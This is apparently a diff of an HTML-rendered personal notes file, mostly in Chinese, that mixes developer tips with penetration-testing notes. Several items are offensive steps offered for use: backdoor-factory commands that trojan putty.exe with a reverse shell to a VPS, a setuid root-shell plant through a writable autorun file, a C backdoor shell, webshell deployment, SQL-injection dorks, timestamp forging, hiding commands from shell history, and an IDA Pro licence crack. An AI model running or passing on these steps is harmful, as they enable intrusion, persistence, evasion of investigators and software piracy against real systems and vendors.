@@ -1027,8 +1108,10 @@ mkdir /tmp/tmp &amp;&amp; find / -name "<span class="ge">*.doc" &gt; /tmp/tmp/do
 
     mimikatz更多用法:
     http://www.07net01.com/2016/02/1280295.html
+
 </span><span class="p">86.</span>sa权限上传文件九种方法:http://www.csdn123.com/html/20130308/49/019024fd66e9a1a793e4344a6cc47175.htm
-<span class="p">87.</span>内网渗透:
+<span class="p">
+87.</span>内网渗透:
     http://www.pojie567.com/blog/?post=5186
     http://www.1990day.com/regeorg-proxychains-gold-partner/
     http://www.codersec.net/%E5%AF%B9%E5%9B%BD%E5%A4%96%E6%9F%90%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%BB%93/
@@ -1044,8 +1127,10 @@ mkdir /tmp/tmp &amp;&amp; find / -name "<span class="ge">*.doc" &gt; /tmp/tmp/do
             nslookup -type=SRV _ldap._tcp.baidu.com
             netdom query fsmo
             net group "domain controllers" /domain
-<span class="p">88.</span>ipc$:http://www.cnblogs.com/lhws/p/4024208.htm
-<span class="p">89.</span>github pages+jekyll搭建个人博客:
+<span class="p">
+88.</span>ipc$:http://www.cnblogs.com/lhws/p/4024208.htm
+<span class="p">
+89.</span>github pages+jekyll搭建个人博客:
         https://www.zhihu.com/question/20223939
         https://github.com/jacobtomlinson/carte-noire
         http://www.tuicool.com/articles/RZbEV3
@@ -1063,11 +1148,14 @@ mkdir /tmp/tmp &amp;&amp; find / -name "<span class="ge">*.doc" &gt; /tmp/tmp/do
         http://reyhan.org/2013/03/jekyll-archive-without-plugins.html   jekyll archive by year
         myblog/posts-by-categories.html                                 jekyll archive by categories
         http://www.ithome.com/html/it/195970.htm                        add music to my pages
-<span class="p">90.</span>kali2.0使用pptp vpn时,需要在高级选项里勾选使用点到点加密,如果还不行则选择最安全的加密(128位),否则不能成功连接,另外,用不了l2tp vpn,不知系统哪里的问题
-<span class="p">91.</span>https://ghostbin.com/  :-&gt; paste? a site has article like:https://ghostbin.com/paste/6kho7?luicode=10000359
+<span class="p">
+90.</span>kali2.0使用pptp vpn时,需要在高级选项里勾选使用点到点加密,如果还不行则选择最安全的加密(128位),否则不能成功连接,另外,用不了l2tp vpn,不知系统哪里的问题
+<span class="p">
+91.</span>https://ghostbin.com/  :-&gt; paste? a site has article like:https://ghostbin.com/paste/6kho7?luicode=10000359
                                                              from:
                                                              http://drops.wooyun.org/pentesting/15117
-<span class="p">92.</span>kali2安装rime输入法:
+<span class="p">
+92.</span>kali2安装rime输入法:
 https://www.goenitz.xyz/post/ubuntu-install-fcitx-rime-and-wubi
        https://wu.nerd.moe/?p=1752
        /usr/bin/rime_dict_manager自带词库管理工具
@@ -1107,13 +1195,15 @@ https://www.goenitz.xyz/post/ubuntu-install-fcitx-rime-and-wubi
     http://www.cnblogs.com/studyzy/archive/2013/01/10/2855403.html
 <span class="p">
 93.</span>windows download:https://www.microsoft.com/en-us/search/result.aspx?q=windows+xp+professional+x64+edition&amp;form=MSHOME
-<span class="p">94.</span>backdoor-factory用法:
+<span class="p">
+94.</span>backdoor-factory用法:
 <span class="p">    1.</span>单独的backdoor-factory:
         backdoor-factory -f /root/Desktop/putty.exe -S (check if the putty.exe is support for backdoor-factory)
         backdoor-factory -f /root/Desktop/putty.exe -s show (show usable kinds of reverse shell supported)
         backdoor-factory -f /root/Desktop/putty.exe -s ...(... is a kind of shell from former 'show' command) -H vps's ip -P 200
 <span class="p">    2.</span>backdoor-factory in veil:--&gt;veil--&gt;list--&gt;number of native/backdoor-factory--&gt;options--&gt;set the options
-<span class="p">95.</span>aspx大马连接报错"/"解决方法:http://www.asp-muma.com/?post=97
+<span class="p">
+95.</span>aspx大马连接报错"/"解决方法:http://www.asp-muma.com/?post=97
    my way defferent from uppon one:
    create a new folder,create a web.config file with below content:
    --------------------------content------------------------
@@ -1124,29 +1214,38 @@ https://www.goenitz.xyz/post/ubuntu-install-fcitx-rime-and-wubi
     <span class="nt">&lt;/configuration&gt;</span>
    --------------------------end of content----------------
    then upon a strong webshell to my new created folder,found no more error.
-<span class="p">96.</span>百度云上传限制绕过:
+<span class="p">
+96.</span>百度云上传限制绕过:
    windows:
         copy 1.rmvb /b + hunxiao.txt /a 1-hunxiao-txt.rmvb
    linux:
         echo niaho &gt;&gt; 1.rmvb
-<span class="p">97.</span>windows中ping google &amp;&amp; ping baidu ==&gt;ping.bat:
+<span class="p">
+97.</span>windows中ping google &amp;&amp; ping baidu ==&gt;ping.bat:
                                          cmd /k "ping www.google.com.hk &amp;&amp; ping www.baidu.com"
    创建ping.bat文件的快捷方式,在快捷方式中添加快捷键.eg.ctrl+alt+p
-<span class="p">98.</span>linux开启http代理:service squid3 status,service squid3 start,vi /etc/squid3/squid.conf default_port:3128
-<span class="p">99.</span>booklist:http://www.jianshu.com/p/67e294106919
-<span class="p">100.</span>gdb:http://www.jianshu.com/p/f20b10ea9a61
-<span class="p">101.</span>study links:
+<span class="p">
+98.</span>linux开启http代理:service squid3 status,service squid3 start,vi /etc/squid3/squid.conf default_port:3128
+<span class="p">
+99.</span>booklist:http://www.jianshu.com/p/67e294106919
+<span class="p">
+100.</span>gdb:http://www.jianshu.com/p/f20b10ea9a61
+<span class="p">
+101.</span>study links:
     http://www.shiyanbar.com/questions/733
     http://ch3rish.lofter.com/post/1d503b96_791362d
-<span class="p">102.</span>linux中suid,sgid,sticky详解:http://crazyming.blog.51cto.com/1048571/467414
+<span class="p">
+102.</span>linux中suid,sgid,sticky详解:http://crazyming.blog.51cto.com/1048571/467414
     find / -type f -perm -4000 -ls &gt; tmp.txt   function:find suid files
         find / -type f -perm -4000 -ls | grep "flag00" &gt; tmp.txt    function:find file has setuid=flag00
     find / -type f -perm -2000 -ls &gt; tmp.txt   function:find sgid files
     find / -perm -2 -type f -print             function:find files can be writeable by everyone
         echo "/bin/cp /bin/sh /tmp/.sh;chmod 4755 /tmp/.sh" &gt;&gt; writeable_file_if_it_is_from_any_autorun_directory
         /tmp/.sh -p(this command to get a euid=root shell)
-<span class="p">103.</span>linux中好用的find命令:http://www.oschina.net/translate/15-practical-unix-linux-find-command-examples-part-2?print
-<span class="p">104.</span>one linux backdoor shell can be like this:(file.c)
+<span class="p">
+103.</span>linux中好用的find命令:http://www.oschina.net/translate/15-practical-unix-linux-find-command-examples-part-2?print
+<span class="p">
+104.</span>one linux backdoor shell can be like this:(file.c)
     #include <span class="nt">&lt;stdlib</span><span class="err">.</span><span class="na">h</span><span class="nt">&gt;</span>
     #include <span class="nt">&lt;unistd</span><span class="err">.</span><span class="na">h</span><span class="nt">&gt;</span>
     #include <span class="nt">&lt;string</span><span class="err">.</span><span class="na">h</span><span class="nt">&gt;</span>
@@ -1178,29 +1277,36 @@ https://www.goenitz.xyz/post/ubuntu-install-fcitx-rime-and-wubi
         ln -s /bin/sh /tmp/echo
     then use webshell role to get a root privilege shell:
         /bin/l2ping
+
 </span><span class="p">105.</span>linux中修改文件时间
     同时修改文件的修改时间和访问时间
     touch -d "2010-05-31 08:10:30" test.doc
-<span class="p">106.</span>rime全角到半角解决方法:如果主机突然变成全角而无法变回半角,从任意地方中复制一个正常的半角字符串到主机中任意地方即可,不用重启
-<span class="p">107.</span>ssh文件复制:eg.本机未登录前执行
+<span class="p">
+106.</span>rime全角到半角解决方法:如果主机突然变成全角而无法变回半角,从任意地方中复制一个正常的半角字符串到主机中任意地方即可,不用重启
+<span class="p">
+107.</span>ssh文件复制:eg.本机未登录前执行
         scp level08@192.168.2.140:/home/level08/capture.pcap /1.pcap     (remote-&gt;local)
         scp /tmp.txt level08@192.168.2.140:/home/level08/                (local-&gt;remote)
-<span class="p">108.</span>echo 'ibase=16;410' | bc 
+<span class="p">
+108.</span>echo 'ibase=16;410' | bc 
         16进制的410转换成默认10进制:out-&gt;1040
     echo 'ibase=16;obase=2;410' | bc
         16进制的410转换成2进制:out-&gt;10000010000
-<span class="p">109.</span>python中ord和int:
+<span class="p">
+109.</span>python中ord和int:
     int('12')=12
     int('b')=error(int的参数只能是'num'类型)
     ord('b')=98
     ord('a')=97
     ord('0')=48
     ord('ascii')=ascii这一个字符对应的十进制整数(ascii只能是a character,not string)
-<span class="p">110.</span>书单
+<span class="p">
+110.</span>书单
         http://www.heysec.org/archives/257
         https://www.zhihu.com/question/24152689
         http://m.blog.csdn.net/article/details?id=45482849
-<span class="p">111.</span>linux上ssh无法以root用户登录解决方法:
+<span class="p">
+111.</span>linux上ssh无法以root用户登录解决方法:
     vi /etc/ssh/sshd_config (attention!,here is not /etc/ssh/ssh_config)
     /PermitRootLogin<span class="nt">&lt;Enter&gt;</span>
     change to:
@@ -1209,71 +1315,96 @@ https://www.goenitz.xyz/post/ubuntu-install-fcitx-rime-and-wubi
     macOS快速开启ssh服务:
     systemsetup -getremotelogin
     systemsetup -setremotelogin on
+
 </span><span class="p">112.</span>gcc编译so文件:
         gcc -shared -fPIC myfile.c -o myfile.socc
-<span class="p">113.</span>wordpress 渗透工具
+<span class="p">
+113.</span>wordpress 渗透工具
 <span class="p">    1.</span>wpscan
 <span class="p">    2.</span>http://www.getwpxf.com/  seems better
 <span class="p">    3.</span>youtube:how to hack wordpress
-<span class="p">114.</span>linux中c代码中多个参数代码编写参考规范:http://blackndoor.com/nebula-level18/
-<span class="p">115.</span>一个十六进制位是4bits,0x12345678是32bits,相当于一个32位系统下的栈单元
+<span class="p">
+114.</span>linux中c代码中多个参数代码编写参考规范:http://blackndoor.com/nebula-level18/
+<span class="p">
+115.</span>一个十六进制位是4bits,0x12345678是32bits,相当于一个32位系统下的栈单元
     一个汉字是2个字符4个字节32位,4 bytes,32 bits
     一个DWORD则是4个字符8个字节64位,8 bytes,64 bits
-<span class="p">116.</span>linux安装程序
+<span class="p">
+116.</span>linux安装程序
     cd program
     ./configure
     make
     sudo make install
-<span class="p">117.</span>linux提权时,编译exploit.c文件时必须在对方系统中编译,或者与对方系统一样的系统中编译,
+<span class="p">
+117.</span>linux提权时,编译exploit.c文件时必须在对方系统中编译,或者与对方系统一样的系统中编译,
     否则本地编译出exploit文件后上传到对方机器运行时会出现can not execute binary file的错误
-<span class="p">118.</span>访问目录时,404不代表文件夹一定不存在,尤其是那些不标准显示的404,有可能是webapp或waf故意这样显示的,
+<span class="p">
+118.</span>访问目录时,404不代表文件夹一定不存在,尤其是那些不标准显示的404,有可能是webapp或waf故意这样显示的,
     但是404显示目录下的文件还是可以正常访问的
-<span class="p">119.</span>c_++头:
+<span class="p">
+119.</span>c_++头:
         using namespace std;
         #include <span class="nt">&lt;iostream&gt;</span>
-<span class="p">120.</span>ida破解,替换ida pro根目录下的ida.key为https://gist.github.com/TheCjw/9f6f7544f33f292db20e下的key文件,
+<span class="p">
+120.</span>ida破解,替换ida pro根目录下的ida.key为https://gist.github.com/TheCjw/9f6f7544f33f292db20e下的key文件,
     然后将系统时间改成1年以前下的key文件,然后将系统时间改成1年以前
-<span class="p">121.</span>ROP就是所谓的Return Orientated Programming,早期也叫ret2libc.
-<span class="p">122.</span>html中的图标    http://fontawesome.io/icons/
-<span class="p">123.</span>fckeditor设置:hhttp://www.itpa.hk/ttp://www.jb51.net/article/17965.htm
-<span class="p">124.</span>html转pdf:
+<span class="p">
+121.</span>ROP就是所谓的Return Orientated Programming,早期也叫ret2libc.
+<span class="p">
+122.</span>html中的图标    http://fontawesome.io/icons/
+<span class="p">
+123.</span>fckeditor设置:hhttp://www.itpa.hk/ttp://www.jb51.net/article/17965.htm
+<span class="p">
+124.</span>html转pdf:
     wkhtmltopdf www.myhomepage.com myhomepage.pdf
     在线pdf编辑 http://www.pdfescape.com/
     本地pdf快速转换:chrome浏览器(全选或部分选择后)右键可打印成pdf<span class="sb">
 
     md转pdf/html
     sublime text 安装markdown preview插件
+
 </span><span class="p">125.</span>printf("%x"):第一个栈里的值
     printf("%3x"):第一个栈里的值,用3个字节长度表示
     printf("%3<span class="se">\$</span>x"):第三个栈里的值(这一条适用于绝大多数的<span class="err">*</span>nix的系统,
     win下不支持则用printf("%x,%x,%x")来达到同样的目的)
     宽度格式符(%3)中的%和3是不分开的,如果%3后面加了<span class="se">\$</span>(直接参数访问)则表示为打印第3个栈里的值
-<span class="p">126.</span>visual studio快速编译一个c文件
+<span class="p">
+126.</span>visual studio快速编译一个c文件
     运行C:<span class="se">\P</span>rogram Files (x86)<span class="se">\M</span>icrosoft Visual Studio 14.0<span class="se">\C</span>ommon7<span class="se">\T</span>ools<span class="se">\V</span>sDevCmd.bat
     然后运行cl md.c
     或者打开tools里面的开发人员提示符,然后再cl md.c
-<span class="p">127.</span>安装sulley过程中首先选用管理员身份安装,如果失败,再手动安装,安装要求python2.4,如果机器上已经安装了python的其
+<span class="p">
+127.</span>安装sulley过程中首先选用管理员身份安装,如果失败,再手动安装,安装要求python2.4,如果机器上已经安装了python的其
     他版本,需要人工将python2.4加入到环境变量中,再去sulley framework的安装目录下中的install_files中将ctypes和
     pcapy用管理员身份安装
-<span class="p">128.</span>sulley中的process_monitor.py中用的是os.system来启动崩溃的程序继续fuzz,这样是阻塞方式,不可以,可改成
+<span class="p">
+128.</span>sulley中的process_monitor.py中用的是os.system来启动崩溃的程序继续fuzz,这样是阻塞方式,不可以,可改成
     os.startfile或subprocess中的popen os.startfile(相当于双击操作,eg. os.startfile("1.txt")):
         http://blog.sina.com.cn/s/blog_4b5039210100froh.html
-<span class="p">129.</span>my_sulley学习资料
+<span class="p">
+129.</span>my_sulley学习资料
     http://pan.baidu.com/s/1c1Y6kVY
-<span class="p">130.</span>linux中批量替换目录文件中的字符串:
+<span class="p">
+130.</span>linux中批量替换目录文件中的字符串:
     sed -i "s/xinghuacai/3xp10it/g" <span class="sb">`grep xinghuacai -rl .`</span>
     or:
     sed -i "s#http://3xp10it.cc#http://3xp10it.cc#g" <span class="sb">`grep xinghuacai -rl .`</span>
     -i是直接修改,而不在屏幕输出的选项
-<span class="p">131.</span>github在push时免输入用户名密码:
+<span class="p">
+131.</span>github在push时免输入用户名密码:
     http://www.cnblogs.com/ballwql/p/3462104.html
-<span class="p">132.</span>mysql中表名为关键字的处理方法,<span class="sb">`table_name`</span>
+<span class="p">
+132.</span>mysql中表名为关键字的处理方法,<span class="sb">`table_name`</span>
     http://www.cnblogs.com/puzi0315/archive/2012/08/27/2658169.html
-<span class="p">133.</span>windows截图神器Snipaste
+<span class="p">
+133.</span>windows截图神器Snipaste
     http://zh.snipaste.com/
-<span class="p">134.</span>windows下rime修改备选词个数:打开default.yaml,修改对应数字
-<span class="p">135.</span>ranger:linux terminal file manage god software
-<span class="p">136.</span>github pages生成的博客本地有语法高亮而正常http://3xp10it.github.io没有语法高亮的原因:
+<span class="p">
+134.</span>windows下rime修改备选词个数:打开default.yaml,修改对应数字
+<span class="p">
+135.</span>ranger:linux terminal file manage god software
+<span class="p">
+136.</span>github pages生成的博客本地有语法高亮而正常http://3xp10it.github.io没有语法高亮的原因:
 	(最近一次导致部分页面没有完全https传输是因为多说的登录后的头像在评论区中的url为http,这个好像无法更改,不登录
 	多说即可,因为登录后头像会变成http://....,而不登录的头像为https://...)
     由于github将博客升级成https://3xp10it.github.io,而本地浏览器访问https://3xp10it.github.io时,出于安全性考虑,
@@ -1307,21 +1438,27 @@ https://www.goenitz.xyz/post/ubuntu-install-fcitx-rime-and-wubi
         <span class="nt">&lt;/html&gt;</span>
     
     如果发现访问不正常可去https://github.com/3xp10it/3xp10it.github.io中的setting查看错误信息
-<span class="p">137.</span>终端字符串生成图像工具
+<span class="p">
+137.</span>终端字符串生成图像工具
     banner
     figlet
     toilet
     http://blog.chinaunix.net/uid-10540984-id-2881092.html
     https://xin053.github.io/2016/07/06/pyfiglet%E5%BA%93%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/
-<span class="p">138.</span>bind shift+e to firefox's perference shortcut key bind
-<span class="p">139.</span>制作pypi的python模块(eg.exp10it.py)时,在本地如果exp10it.py中有中文,在一个正常的py文件中如果有一句
+<span class="p">
+138.</span>bind shift+e to firefox's perference shortcut key bind
+<span class="p">
+139.</span>制作pypi的python模块(eg.exp10it.py)时,在本地如果exp10it.py中有中文,在一个正常的py文件中如果有一句
     from exp10it import <span class="err">*</span>,如果这个正常的py文件中由于这句导入了相同文件夹目录下的exp10it.py模块,会由于其中的中文
     而产生错误,可以上传到pypi后由pip install安装exp10it模块后使用from exp10it import <span class="err">*</span>,同时需要删除同目录下的
     exp10it.py文件,否则from exp10it import <span class="err">*</span>依然会优先从同目录下找exp10it.py模块
-<span class="p">140.</span>sqlmap得出经验,一般跑出只有盲注的uri注入点,一般都是由于waf拦截了普通的union注入语句,只要想办法绕过waf就可以
+<span class="p">
+140.</span>sqlmap得出经验,一般跑出只有盲注的uri注入点,一般都是由于waf拦截了普通的union注入语句,只要想办法绕过waf就可以
     用union来快速注入了,否则只能用sqlmap跑出来的盲注payload进行慢慢的注入,且有可能不能注入出所有数据,依然被waf拦截
-<span class="p">151.</span>python模块中声明编码为utf-8的注释代码不用放在前两行,如果出错,说明代码其他地方有误
-<span class="p">152.</span>compiz和unity的问题:
+<span class="p">
+151.</span>python模块中声明编码为utf-8的注释代码不用放在前两行,如果出错,说明代码其他地方有误
+<span class="p">
+152.</span>compiz和unity的问题:
     dconf reset -f /org/compiz
     setsid unity
     unity --reset-icons<span class="sb">
@@ -1349,29 +1486,39 @@ https://www.goenitz.xyz/post/ubuntu-install-fcitx-rime-and-wubi
           上面2中无效时用3有效
     本机出现窗口没有"关闭,最小化"等解决方法:
         打开compiz设置在窗口管理处勾选"放置窗口"
+
 </span><span class="p">153.</span>linux清理:
     1&gt;apt-get autoremove
     2&gt;apt-get autoclean
     3&gt;apt-get clean
     4&gt;dpkg -l |grep ^rc|awk '{print $2}' |sudo xargs dpkg -P(一键删除残余配置文件)
-<span class="p">154.</span>ubuntu audio:http://forum.ubuntu.org.cn/viewtopic.php?t=324619
-<span class="p">156.</span>pip install exp10it -U出现无法立刻升级处理办法:pip install exp10it=(local_latest_version)
-<span class="p">157.</span>grep多行匹配:(eg.匹配exp10it.py中的api)
+<span class="p">
+154.</span>ubuntu audio:http://forum.ubuntu.org.cn/viewtopic.php?t=324619
+<span class="p">
+156.</span>pip install exp10it -U出现无法立刻升级处理办法:pip install exp10it=(local_latest_version)
+<span class="p">
+157.</span>grep多行匹配:(eg.匹配exp10it.py中的api)
     pcregrep -M 'def .<span class="ge">*(.*</span>):<span class="se">\n</span>(.<span class="ge">*#.*</span><span class="se">\n</span>){1,10}'
-<span class="p">158.</span>linux下vmware中有一台机器止住导致其他虚拟机也无法进入解决方法:
+<span class="p">
+158.</span>linux下vmware中有一台机器止住导致其他虚拟机也无法进入解决方法:
     ps -aux | grep "vmware"
     kill pid_of_error_machine
-<span class="p">159.</span>google dock:
+<span class="p">
+159.</span>google dock:
     http://waziristanihaxor.blogspot.hk/2015/03/5000-fresh-google-dorks-list-for-sql.html
     inurl:"php"|"php page="|"php id="|"php tid="|"php pid="|"php cid="|"php path="|"php cmd="|"php file="|"php cartId="|"php bookid="|"php num="|"php idProduct="|"php ProdId="|"php idCategory="|"php intProdID="|"cfm storeid="|"php catid="|"php cart_id="|"php order_id="|"php catalogid="|"php item="|"php title="|"php CategoryID="|"php action="|"php newsID="|"php newsid="|"php product_id="|"php cat="|"php parent_id="|"php view="|"php itemid=" site:www.facebook.com
     site:xxx.xxx.xxx inurl:union select
     site:xxx.xxx.xxx intext:warning|error|syntax|incorrect|unexpected|occurred|command|execute
-<span class="p">160.</span>my own github's md file:
+<span class="p">
+160.</span>my own github's md file:
     每行111个字节长度,但是写md时并不用在vim中设置111个字节长度后自动换行,因为md文件会在应该换行的时候自动换行,只要将一段的内容写到md文件中的一行中即可
-<span class="p">161.</span>echo $HISTCONTROL,如果结果为ignoreboth,执行命令时先加空格再输入命令则history不会记录
-<span class="p">162.</span>github-pages 使用多说
+<span class="p">
+161.</span>echo $HISTCONTROL,如果结果为ignoreboth,执行命令时先加空格再输入命令则history不会记录
+<span class="p">
+162.</span>github-pages 使用多说
     http://www.ituring.com.cn/article/114888
-<span class="p">163.</span>windbg调试命令详解:
+<span class="p">
+163.</span>windbg调试命令详解:
     http://www.yiiyee.cn/Blog/windbg/
     http://www.cppblog.com/weiym/archive/2012/06/07/177958.aspx
     db esi:查看esi地址中的内容
@@ -1391,18 +1538,23 @@ https://www.goenitz.xyz/post/ubuntu-install-fcitx-rime-and-wubi
     ? ebp-edi:显示表达式ebp-edi的值
         ?? expression:显示c++表达式的值
     .cls:清屏
-<span class="p">164.</span>firefox好用的一个翻译附加组件:
+<span class="p">
+164.</span>firefox好用的一个翻译附加组件:
     S3.Google Translator
-<span class="p">165.</span>firefox的vimperator插件使用:
+<span class="p">
+165.</span>firefox的vimperator插件使用:
     http://wangbixi.com/x2923/comment-page-1/
     http://pchu.blogbus.com/
     http://luoxiqofy.blogbus.com
     http://www.cnblogs.com/flywuya/archive/2010/12/29/1920485.html
-<span class="p">166.</span>恶意文档分析技巧及工具快速参考
+<span class="p">
+166.</span>恶意文档分析技巧及工具快速参考
     http://wenku.baidu.com/link?url=m7GL0Q9W8Pei47frvTquIe9pAgKejBtPesAwZFiClOAEHK23ZF5xRxqA8eowV6e1HiKscwjxIWNOFRC3ep78yFurtSN5L0ZjQ0gV4uu72Lq
-<span class="p">167.</span>ubuntu安装java
+<span class="p">
+167.</span>ubuntu安装java
     http://www.linuxdiyf.com/linux/21071.html
-<span class="p">168.</span>文件下载或文件读取漏洞思路:
+<span class="p">
+168.</span>文件下载或文件读取漏洞思路:
     1&gt;读数据库连接文件
     2&gt;尝试连接数据库
         a&gt;是否支持数据库外连
@@ -1414,37 +1566,50 @@ https://www.goenitz.xyz/post/ubuntu-install-fcitx-rime-and-wubi
             或者如果数据库中有editor的setting,修改为可以上传php
     3&gt;尝试读取到ftp配置文件,尝试用数据库用户名密码连接ftp
     4&gt;代码审计
-<span class="p">169.</span>www.gnu.org上可以下载linux系统自带的工具,eg.find工具
-<span class="p">170.</span>discuz漏洞扫描工具
+<span class="p">
+169.</span>www.gnu.org上可以下载linux系统自带的工具,eg.find工具
+<span class="p">
+170.</span>discuz漏洞扫描工具
     dzscan
     https://github.com/code-scan/dzscan
-<span class="p">171.</span>windbg中找不到symbol路径解决方法:
+<span class="p">
+171.</span>windbg中找不到symbol路径解决方法:
     .sympath srv<span class="ge">*c:symbols*</span>http://msdl.microsoft.com/download/symbols
     .reload /f
-<span class="p">172.</span>《深入理解计算机系统》读书参照
+<span class="p">
+172.</span>《深入理解计算机系统》读书参照
     http://wdxtub.com/2016/04/16/thin-csapp-0/
     http://www.voidcn.com/blog/zym0017d/article/p-540879.html
-<span class="p">173.</span>实用的搜索引擎
+<span class="p">
+173.</span>实用的搜索引擎
     http://kaopu.so/
-<span class="p">174.</span>awk实用指南
+<span class="p">
+174.</span>awk实用指南
     http://awk.readthedocs.io/en/latest/chapter-one.html
-<span class="p">175.</span>ssrf相关
+<span class="p">
+175.</span>ssrf相关
     http://evilcos.me/?p=221
-<span class="p">176.</span>find查找最近的文件:
+<span class="p">
+176.</span>find查找最近的文件:
     find / -amin -10 # 查找在系统中最后10分钟访问的文件
     find / -atime -2 # 查找在系统中最后48小时访问的文件
     
     find / -mmin -5 # 查找在系统中最后5分钟里修改过的文件
     find / -mtime -1 #查找在系统中最后24小时里修改过的文件76
-<span class="p">177.</span>php数组键值对
+<span class="p">
+177.</span>php数组键值对
     http://www.cnblogs.com/coderchuanyu/p/3904711.html
-<span class="p">178.</span>快速查看webshell大马是否含有后门:
+<span class="p">
+178.</span>快速查看webshell大马是否含有后门:
     firebug|网络,如果看到访问大马时还有其他可疑访问uri,说明有后门
-<span class="p">179.</span>pyc文件相当于pyhton文件的缓存,如果import了某个模块后在目录下生成了pyc文件,就算这个刚才被import的py模块被删
+<span class="p">
+179.</span>pyc文件相当于pyhton文件的缓存,如果import了某个模块后在目录下生成了pyc文件,就算这个刚才被import的py模块被删
     除了,但是由于pyc文件还存在,仍然可以import 该模块
-<span class="p">180.</span>python查看模块中有哪些函数(dir()用法)
+<span class="p">
+180.</span>python查看模块中有哪些函数(dir()用法)
     http://www.iplaypython.com/jichu/dir.html
-<span class="p">181.</span>python多线程中使用multiprocessing.pool参数为多个的使用方法
+<span class="p">
+181.</span>python多线程中使用multiprocessing.pool参数为多个的使用方法
     http://stackoverflow.com/questions/4474940/unsupported-operand-types-exception-with-threappool-map-but-not-map<span class="sb">
 
     from multiprocessing.dummy import Pool as ThreadPool
@@ -1478,20 +1643,27 @@ https://www.goenitz.xyz/post/ubuntu-install-fcitx-rime-and-wubi
 
 </span><span class="p">182.</span>cms在线识别
     http://whatweb.bugscaner.com/
-<span class="p">183.</span>Netifera(域分析神器)
-<span class="p">184.</span>渗透图
+<span class="p">
+183.</span>Netifera(域分析神器)
+<span class="p">
+184.</span>渗透图
     http://images0.cnblogs.com/blog2015/640760/201506/121255389739630.png
     http://www.e-wolf.top/content/uploadfile/201608/0f9f1471011328.jpg
-<span class="p">185.</span>python函数嵌套时在内层函数中操作外层函数的变量,不使用全局变量的方法
+<span class="p">
+185.</span>python函数嵌套时在内层函数中操作外层函数的变量,不使用全局变量的方法
     http://www.crifan.com/python_access_parent_nesting_function_local_variable_from_nested_function/
-<span class="p">186.</span>python使用mechanize进行web交互(可列表单,填表单,提交表单,使用代理等很方便)
+<span class="p">
+186.</span>python使用mechanize进行web交互(可列表单,填表单,提交表单,使用代理等很方便)
     http://blog.csdn.net/jeanphorn/article/details/46917159
     http://blog.chinaunix.net/uid-26722078-id-3507409.html
-<span class="p">187.</span>python显示进度条方法
+<span class="p">
+187.</span>python显示进度条方法
     http://www.111cn.net/phper/python/66812.htm
-<span class="p">188.</span>python中https访问认证失败解决方法:
+<span class="p">
+188.</span>python中https访问认证失败解决方法:
     http://bookshadow.com/weblog/2015/04/22/sae-python-weibo-sdk-certificate-verify-failed/
-<span class="p">189.</span>python中sys.stdout模块
+<span class="p">
+189.</span>python中sys.stdout模块
     http://www.cnblogs.com/turtle-fly/p/3280519.html
     a. print "something"   相当于sys.stdout.write("something<span class="se">\n</span>")
     b. print "something",  相当于sys.stdout.write("something")<span class="sb">
@@ -1499,6 +1671,7 @@ https://www.goenitz.xyz/post/ubuntu-install-fcitx-rime-and-wubi
     没有换行的print或sys.stdout.write()都不会立即打印出来,需要遇到有换行的地方才会显示,或者没有遇到换行只能在
     程序运行结束后强制显示,也即b中的方法不会打印出内容到终端,加sys.stdout.flush()才可以马上显示,或者遇到下面的
     print有换行功能,或者程序结束才会打印出来
+
 </span><span class="p">190.</span>查看python模块文档
         python -m pydoc -p 500
     python官方文档中文站
@@ -1516,9 +1689,11 @@ https://www.goenitz.xyz/post/ubuntu-install-fcitx-rime-and-wubi
         sys.stdout.truncate.__doc__
         sys.stdout.close.__doc__
         ...
+
 </span><span class="p">191.</span>快速查看windows是32|64位
     dxdiag
-<span class="p">192.</span>python在一行打印的方法
+<span class="p">
+192.</span>python在一行打印的方法
     eg.
     PASSWORD=password+(50-len(password))<span class="err">*</span>" "
     sys.stdout.write('-'<span class="err">*</span>(try_time<span class="p">[</span><span class="nv">0</span><span class="p">]</span>/(sum<span class="p">[</span><span class="nv">0</span><span class="p">]</span>/100))+'&gt;'+str(try_time<span class="p">[</span><span class="nv">0</span><span class="p">]</span>/(sum<span class="p">[</span><span class="nv">0</span><span class="p">]</span>/100))+'%'+' %s/%s %s<span class="se">\r</span>' % <span class="err">\</span>
@@ -1527,39 +1702,55 @@ https://www.goenitz.xyz/post/ubuntu-install-fcitx-rime-and-wubi
     其中password长度是变化的,使用print "<span class="se">\b</span>"或sys.stdout.write("<span class="se">\b</span>")想达到退格的效果无果后,考虑到的技巧:声明好
     一个尾部是空格串的PASSWORD,将动态变化的password放入PASSWORD的最前面,这样就是每次在同一行打印长度不变的字符
     串了,就不会由于password由长变短后突出的长的尾巴不能用退格清除而烦恼了
-<span class="p">193.</span>python中打开文件可以用with open() f的方式来打开文件:
+<span class="p">
+193.</span>python中打开文件可以用with open() f的方式来打开文件:
         with open(r'user.dic', 'r') as fUser:  # 使用with as 来打开文件,不需自己关闭文件,因为他会自己在合适的时
         候自已关闭(类似C# 中的using(...){}接口)
-<span class="p">194.</span>windows下bat对指定日期内的文件的操作
+<span class="p">
+194.</span>windows下bat对指定日期内的文件的操作
     http://www.111cn.net/sys/Windows7/81187.htm
-<span class="p">195.</span>css中加载本地不存在的外部字体时,用@font-face,@font-face要写在css文件的开头(全局可用)的位置,不能写在局部的
+<span class="p">
+195.</span>css中加载本地不存在的外部字体时,用@font-face,@font-face要写在css文件的开头(全局可用)的位置,不能写在局部的
     css属性里面
 	在线中文字库:
 		www.youziku.com
 		文泉驿等宽正黑:http://www.youziku.com/webfont/index/259
-<span class="p">196.</span>验证码识别
+<span class="p">
+196.</span>验证码识别
     http://www.polarxiong.com/archives/python-pytesser-tesseract.html
     google的pytesser模块2007年的,放弃使用,直接自己调用tesseract达到识别验证码功能
-<span class="p">197.</span>pip install exp10it --upgrade无法立即更新解决方法:
+<span class="p">
+197.</span>pip install exp10it --upgrade无法立即更新解决方法:
     pip install exp10it --upgrade --allow-external=exp10it --allow-unverified=exp10it
     不行尝试删除本地exp10it.pyc?
     pip install exp10it --upgrade --no-cache-dir
-<span class="p">198.</span>python的tab键raw_input()文件路径自动补全
+<span class="p">
+198.</span>python的tab键raw_input()文件路径自动补全
     https://gist.github.com/iamatypeofwalrus/5637895
-<span class="p">199.</span>command 1&gt;/dev/null 2&gt;/dev/null &amp;
+<span class="p">
+199.</span>command 1&gt;/dev/null 2&gt;/dev/null &amp;
     1&gt;/dev/null表示将命令的标准输出重定向到/dev/null
